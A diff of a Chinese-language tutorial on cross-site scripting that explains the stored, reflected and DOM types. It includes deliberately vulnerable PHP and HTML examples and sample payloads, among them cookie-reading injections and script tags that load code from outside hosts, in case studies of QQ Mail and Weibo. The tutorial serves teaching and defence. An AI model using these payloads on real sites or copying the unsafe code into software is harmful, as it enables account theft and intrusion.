@@ -1,16 +1,175 @@
 # XSS攻击
 
-> 本文转载至：[给你讲清楚什么是XSS攻击 - 程序员自由之路 - 博客园 (cnblogs.com)](https://www.cnblogs.com/54chensongxia/p/11643787.html)
-
-## 一. 什么是XSS攻击
-
 跨站脚本攻击（Cross Site Scripting）本来的缩写为CSS，为了与层叠样式表（Cascading Style Sheets，CSS）的缩写进行区分，将跨站脚本攻击缩写为XSS。因此XSS是跨站脚本的意思。
 
 XSS跨站脚本攻击（Cross Site Scripting）的本质是攻击者在web页面插入恶意的script代码（这个代码可以是JS脚本、CSS样式或者其他意料之外的代码），当用户浏览该页面之时，嵌入其中的script代码会被执行，从而达到恶意攻击用户的目的。比如读取cookie，token或者网站其他敏感的网站信息，对用户进行钓鱼欺诈等。比较经典的事故有：
 
-> 2011年6月28日，新浪微博被XSS攻击，大量用户自动转发微博、私信。自动关注用户，大量用户被莫名其妙地控制。因为可以使用JS代码代替用户单击按钮发送请求，所以损坏非常大。
+## 一. 存储型XSS攻击
 
-### 1.1 XSS攻击的危害
+### 1.1 攻击原理
+
+存储型XSS又称为持久型XSS，是指：攻击者将XSS代码发送给了后端，而后端没有对这些代码做处理直接存储在数据库中。当用户访问网站时，又直接从数据库调用出来传给前端，前端解析XSS代码就造成了XSS攻击。
+
+存储型 XSS 的攻击步骤：
+
+1. 攻击者将恶意代码提交到目标网站的数据库中。
+2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
+3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
+4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
+
+这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。
+
+![](../images/11.png)
+
+### 1.2 案例
+
+某天，公司需要一个留言板，用户可以自由输入留言内容并提交。代码如下：
+
+```php
+<?php
+	$nickname = @$_POST['nickname'];//昵称
+	$email = @$_POST['email'];//邮箱
+	$content = @$_POST['content'];//留言内容
+	$now_time = @$_POST['now_time'];//留言时间
+	$ini= @parse_ini_file("config.ini");
+    $con = @mysql_connect($ini["servername"],$ini["username"],$ini["password"]);
+	if($con){
+		mysql_query("set names 'utf8'");//解决中文乱码问题
+		mysql_select_db($ini["dbname"]);
+		$sql1 = "select count(*) from message_board";
+		$result = mysql_query($sql1);
+		$floor = mysql_fetch_row($result)[0] + 1;
+		$sql = "insert into message_board values($floor,\"$nickname\",\"$email\",\"$content\",\"$now_time\")";
+		mysql_query($sql);
+	}
+
+?>
+```
+
+上线后不久，小李就在数据库中发现了一些奇怪的留言：
+
+```txt
+<script>alert(1)</script>
+```
+
+打开留言板版后，弹出了如下弹框：
+
+![](../images/13.png)
+
+
+
+> 可恶，中招了！小李眉头一皱，查看源代码，发现攻击代码已经注入进来：
+
+![](../images/14.png)
+
+## 二. 反射型XSS攻击
+
+### 2.1 攻击原理
+
+反射型XSS又称为做非持久型XSS，也是最常用，使用最广的一种方式。它是指通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行。它的特点是非持久化，必须用户点击带有特定参数的链接才能引起。
+
+**它的根本原因，是网站过于信任URL上的参数，不经过任何处理，直接拼接至页面导致的问题**。
+
+反射型 XSS 的攻击步骤：
+
+1. 攻击者构造出特殊的 URL，其中包含恶意代码。
+2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
+3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
+4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
+
+攻击者可以通过邮件，或者搜索引擎等将带有XSS攻击代码的链接投放给用户，用户点击链接后，页面会从URL上取出对应的参数，渲染到页面上，此时攻击代码将会被执行。
+
+### 2.2 案例
+
+某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：
+
+```html
+<input type="text" value="<%= getParameter("keyword") %>">
+<button>搜索</button>
+<div>
+  您搜索的关键词是：<%= getParameter("keyword") %>
+</div>
+```
+
+然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：
+
+```
+http://xxx/search?keyword="><script>alert('XSS');</script>
+```
+
+小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着”XSS”的对话框。
+
+> 可恶，中招了！小明眉头一皱，发现了其中的奥秘：
+
+当浏览器请求 `http://xxx/search?keyword="><script>alert('XSS');</script>` 时，服务端会解析出请求参数 `keyword`，得到 `"><script>alert('XSS');</script>`，拼接到 HTML 中返回给浏览器。形成了如下的 HTML：
+
+```html
+<input type="text" value=""><script>alert('XSS');</script>">
+<button>搜索</button>
+<div>
+  您搜索的关键词是："><script>alert('XSS');</script>
+</div>
+```
+
+浏览器无法分辨出 `<script>alert('XSS');</script>` 是恶意代码，因而将其执行。
+
+这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。
+
+## 三. DOM型XSS攻击
+
+### 3.1 攻击原理
+
+DOM 型 XSS 的攻击步骤：
+
+1. 攻击者构造出特殊的 URL，其中包含恶意代码。
+2. 用户打开带有恶意代码的 URL。
+3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
+4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
+
+DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。
+
+### 3.2 案例
+
+某一天前端开发的一个页面，需要回显用户在输入框输入的内容，代码如下：
+
+```html
+<div id="xssd_main">
+    <script>
+        function domxss(){
+            var str = document.getElementById("text").value;
+            document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
+        }
+    </script>
+
+    <input id="text" name="text" type="text"  value="" />
+    <input id="button" type="button" value="click me!" onclick="domxss()" />
+    <div id="dom"></div>
+</div>
+```
+
+当用户在输入框输入 `#'onclick="alert('1_Ry')">` 时，页面的源码渲染为：
+
+![](../images/15.png)
+
+
+
+此时如果用户继续点击生成的 `<a>`标签，就会触发脚本。
+
+### 3.3 如何预防DOM型XSS攻击
+
+DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。
+
+在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 `.textContent`、`.setAttribute()` 等。
+
+如果用 Vue/React 技术栈，并且不使用 `v-html`/`dangerouslySetInnerHTML` 功能，就在前端 render 阶段避免 `innerHTML`、`outerHTML` 的 XSS 隐患。
+
+DOM 中的内联事件监听器，如 `location`、`onclick`、`onerror`、`onload`、`onmouseover` 等，`<a>` 标签的 `href` 属性，JavaScript 的 `eval()`、`setTimeout()`、`setInterval()` 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。
+
+## 四. XSS攻击的危害
+
+上述示例中没有对网站、用户造成实际伤害，但是只需要将攻击执行的脚本换成其他恶意代码，比如说获取用户Cookie然后通过Ajax请求，将获取到的用户Cookie发送至攻击者所搭建的服务器上，这样用户登录态就被黑客盗取，带来的后果可想而知。
+
+但是脚本攻击的危害远远不仅如此，包括但不限于：
 
 - 通过 document.cookie 盗取 cookie中的信息
 - 使用 js或 css破坏页面正常的结构与样式
@@ -19,99 +178,41 @@ XSS跨站脚本攻击（Cross Site Scripting）的本质是攻击者在web页面
 - 利用 iframe、frame、XMLHttpRequest或上述 Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用 iframe，frame进一步的进行 CSRF 攻击。
 - 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。
 
-## 二. XSS攻击的类型
+## 五. XSS攻击案例
 
-### 2.1 反射型XSS攻击
+### 5.1 QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞
 
-反射型XSS漏洞常见于通过URL传递参数的功能，如网站搜索，跳转等。由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。比如下面的URL：
+攻击者发现 `http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb` 这个 URL 的参数 `uin`、`domain` 未经转义直接输出到 HTML 中。
 
-```
-http://x.x.x.x:8080/dosomething?message="<script src="http://www.hacktest.com:8002/xss/hacker.js"></script>"
+于是攻击者构建出一个 URL，并引导用户去点击： `http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B`
 
-或者
+用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：
 
-http://localhost/test.php?param=<script>alert(/xss/)</script>
-```
-
-POST的内容也可以触发反射型XSS，只不过它的触发条件比较苛刻（构建表单提交页面，并引导用户点击），所以非常少见。
-
-**反射型XSS的攻击步骤**
-
-1.攻击者构造出特殊的URL，其中包含恶意代码.
-2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.
-3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。
-4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。
-
-在网上找了一个大致示意图，凑合着看。
-![](../images/5.png)
-
-**注意：**Chrome和Safari能够检测到url上的xss攻击，将网页拦截掉，但是其他浏览器不行，如IE和Firefox。
-
-**防御反射型XSS攻击**
-
-1. 对输入检查
-   对请求参数进行检查，一旦发现可疑的特殊字符就拒绝请求。需要注意的是用户可以绕过浏览器的检查，直接通过Postman等工具进行请求，所以这个检查最好前后端都做。
-2. 对输出进行转义再显示
-   通过上面的介绍可以看出，反射型XSS攻击要进行攻击的话需要在前端页面进行显示。所以在输出数据之前对潜在的威胁的字符进行编码、转义也是防御XSS攻击十分有效的措施。比如下面的方式:
-
-```js
-Copyapp.get('/welcome',function(req,res){
-  //对查询参数进行编码，避免反射型 XSS攻击
-  res.send(`${encodeURIComponent(req.query.type)}`);
-})
+```html
+<script>
+getTop().location.href="/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa"+"&t="+"&d=bbbb";return false;</script><script>alert(document.cookie)</script>"+"...
 ```
 
-### 2.2 存储型XSS攻击
+浏览器接收到响应后就会执行 `alert(document.cookie)`，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。
 
-恶意脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器传回并执行，影响范围比反射型和DOM型XSS更大。存储型XSS攻击的原因仍然是没有做好数据过滤：前端提交数据至服务器端时，没有做好过滤;服务端在按受到数据时，在存储之前，没有做过滤;前端从服务器端请求到数据，没有过滤输出。
+### 5.2 新浪微博名人堂反射型 XSS 漏洞
 
-比较常见的场景是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客的用户，都会在他们的浏览器中执行这段恶意js代码。
+攻击者发现 `http://weibo.com/pub/star/g/xyyyd` 这个 URL 的内容未经过滤直接输出到 HTML 中。
 
-**存储型XSS的攻击步骤**
+于是攻击者构建出一个 URL，然后诱导用户去点击：
 
-1.攻击者将恶意代码提交到目标网站的数据库中。
-2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。
-3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
-4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，凋用目标网站接口执行攻击者指定的操作.
-这种攻击常见于带有用户保存数据的网站功能，如论坛发帖，商品评论，用户私信等。
-
-![img](../images/3.png)
-
-**预防存储型XSS攻击**
-预防存储型XSS攻击也是从输入和输出两个方面来考虑。
-
-- 服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符;
-- 前端接收到服务器传递过来的数据，在展示到页面前，先进行转义/过滤;
-
-不论是反射型攻击还是存储型，攻击者总需要找到两个要点，即“输入点”与"输出点"，也只有这两者都满足，XSS攻击才会生效。“输入点”用于向 web页面注入所需的攻击代码，而“输出点”就是攻击代码被执行的地方。
-
-### 2.3 DOM型XSS
-
-DOM型XSS攻击，实际上就是前端javascript代码不够严谨，把不可信的内容插入到了页面，在使用.innerHTML、.outerHTML、.appendChild、document.write()等API时要特别小心，不要把不可信的数据作为HTML插入到页面上，尽量使用.innerText、.textContent、.setAttribut()等.
-
-**DOM型XSS攻击步骤**
-
-1.攻击者构造出特殊数据，其中包含恶意代码。
-2.用户浏览器执行了恶意代码
-3.恶意窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作.
-
-DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端javascript自身的安全漏洞.
-
-### 2.4 简单总结
-
-![img](../images/4.png)
-
-## 三. 一些其他的防范策略
-
-- HTTP-only Cookie:禁止JavaScript读取某些敏感Cookie，攻击者完成XSS注入后也无法窃取此Cookie属性：防止脚本冒充用户提交危险操作
-- 在服务端使用HTTP的Content-Security-Policy头部来指定策略，或者在前端设置meta标答。例如下面的配置只允许加载同域下的资源:
-
-```js
-CopyContent-Security-Policy:default-src 'self'`请输入代码`
-
-<meta http-equiv="Content-Security-Policy" content="form-action 'self';">
+```
+http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>
 ```
 
-- 当然也可以使用线程的安全扫描工具来检测。
+用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：
 
-就目前而言，应对XSS攻击的主要手段还是编码与过滤两种，编码用于将特殊的符号 "<、>、&、'、""进行**html转义**，而过滤则是阻止特定的标记、属性、事件。如果你不愿意为了严格的安全而限制产品本身的灵活，那么我更建议采用“编码”的方案。
+```html
+<li><a href="http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>">按分类检索</a></li>
+```
+
+浏览器接收到响应后就会加载执行恶意脚本 `//xxxx.cn/image/t.js`，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。
+
+> 本文参考至：
+>
+> [前端安全系列（一）：如何防止XSS攻击？ - 美团技术团队 (meituan.com)](https://tech.meituan.com/2018/09/27/fe-security.html)
